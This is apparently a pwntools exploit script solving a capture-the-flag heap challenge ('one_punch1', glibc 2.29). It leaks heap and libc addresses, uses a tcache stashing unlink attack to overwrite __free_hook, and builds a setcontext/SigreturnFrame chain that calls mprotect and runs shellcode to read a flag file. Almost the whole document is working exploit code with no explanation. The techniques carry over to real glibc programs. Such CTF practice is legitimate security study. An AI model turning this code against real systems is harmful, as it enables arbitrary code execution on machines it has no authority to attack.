#! /usr/bin/env python3
from pwn import *

arch = 64
challenge = 'one_punch1'

context.os='linux'
context.log_level = 'debug'
if arch==64:
    context.arch='amd64'
if arch==32:
    context.arch='i386'
context.terminal = ['tmux', 'splitw', '-h']
elf = ELF(challenge)
libc = ELF('libc-2.29.so')

local = 1
if local:
    p = process(challenge)
else:
    p = remote('chuj.top', '53178')

def eat():
    p.recvuntil('#   5. Exit                #\n')
    p.recvuntil('############################\n')
    p.recvuntil('> ')

def create(index,content):
    eat()
    p.sendline('1')
    p.recvuntil('idx: ')
    p.sendline(str(index))
    p.recvuntil('hero name: ')
    p.send(content)

def edit(index,content):
    eat()
    p.sendline('2')
    p.recvuntil('idx: ')
    p.sendline(str(index))
    p.recvuntil('hero name: ')
    p.send(content)

def show(index):
    eat()
    p.sendline('3')
    p.recvuntil('idx: ')
    p.sendline(str(index))

def delete(index):
    eat()
    p.sendline('4')
    p.recvuntil('idx: ')
    p.sendline(str(index))

def backdoor(content):
    eat()
    p.sendline('50056')
    sleep(0.1)
    p.send(content)

def debug():
    gdb.attach(p)
    pause()

bps = [0x133D]
pie = 1
def gdba():
    if local == 0:
        return 0
    cmd ='set follow-fork-mode parent\n'
    #cmd=''
    if pie:
        base = int(os.popen("pmap {}|awk '{{print $1}}'".format(p.pid)).readlines()[1],16)
        cmd += ''.join(['b *{:#x}\n'.format(b+base) for b in bps])
        cmd += 'set $base={:#x}\n'.format(base)
    else:
        cmd+=''.join(['b *{:#x}\n'.format(b) for b in bps])

    gdb.attach(p,cmd)


# leak_heapbase
create(0,'1'*0x80)
create(1,'1'*0x80)
delete(0)
delete(1)
show(1)
p.recvuntil('hero name: ')
heap_base = u64(p.recv(6).ljust(8,b'\x00'))-0x260
log.success('heap_base: ' + hex(heap_base))


# leak_libc
for i in range(7):
    create(0,'1'*0x90)
    delete(0)

create(0,'1'*0x90)
create(1,'1'*0x90)#* 防止进入 top

delete(0)

show(0)
p.recvuntil('hero name: ')
libc.address = u64(p.recv(6).ljust(8, b"\x00"))-0x1e4ca0
log.success("libc.address: "+hex(libc.address))
malloc_hook = libc.symbols['__malloc_hook']
log.success('malloc_hook: ' + hex(malloc_hook))
free_hook = libc.symbols['__free_hook']
log.success('free_hook: ' + hex(free_hook))
setcontext_addr = libc.symbols['setcontext']
log.success('setcontext_addr: ' + hex(setcontext_addr))
mprotect_addr = libc.symbols['mprotect']
log.success('mprotect_addr: ' + hex(mprotect_addr))

# tcache_stashing_unlink_attack
for i in range(1):
    create(0,'1'*0x210)
    delete(0)

edit(0,p64(free_hook))

create(0,'1'*0x90)#* small_bins 中的 chunk 申请出来

for i in range(4):#! tache[0x90][7]
    create(0,'1'*0x80)
    delete(0)


for i in range(7):
    create(0,'1'*0x1f0)
    delete(0)

# for i in range(7):
#     create(0, '1' * 0x2f0)
#     delete(0)

create(1,'1'*0x1f0)
create(0,'1'*0x350)

create(2, '1'*0x1f0)
create(0,'1'*0x300)

delete(1)
delete(2)


create(0,'1'*0x160)# qie


create(0,'1'*0x160)# qie


create(0,'1'*0x400)


fd = heap_base+0x1ce0 #* 维持原来的 fd 
bk = heap_base+0x20

edit(2,b'1'*0x160+p64(0)+p64(0x91)+p64(fd)+p64(bk))


create(0,'1'*0x80)

create(0,'1'*0x400)

backdoor('1')

jmp_rax_addr = libc.address + 0x12BE97 # mov rdx, [rdi+8] ; mov rax, qword ptr [rdi] ; mov rdi, rdx ; jmp rax
backdoor(p64(jmp_rax_addr))
# backdoor(p64(setcontext_addr+53))

shellcode = asm(shellcraft.open("./flag", 0))
shellcode += asm(shellcraft.read(3, heap_base + 0x10, 0x30))
shellcode += asm(shellcraft.write(1, heap_base + 0x10, 0x30))


heap_addr = heap_base+0x29f0+0x10+0x10

frame = SigreturnFrame()
frame.rdi = heap_base & 0xfffffffffffff000
frame.rsi = 0x21000
frame.rdx = 7
frame.rip = mprotect_addr #rcx
frame.rsp = heap_addr + len(bytes(frame))
payload = p64(setcontext_addr+53) + p64(heap_addr) + bytes(frame) + p64(heap_addr + len(bytes(frame)) + 8) + shellcode

edit(0, payload)
delete(0)

p.interactive()
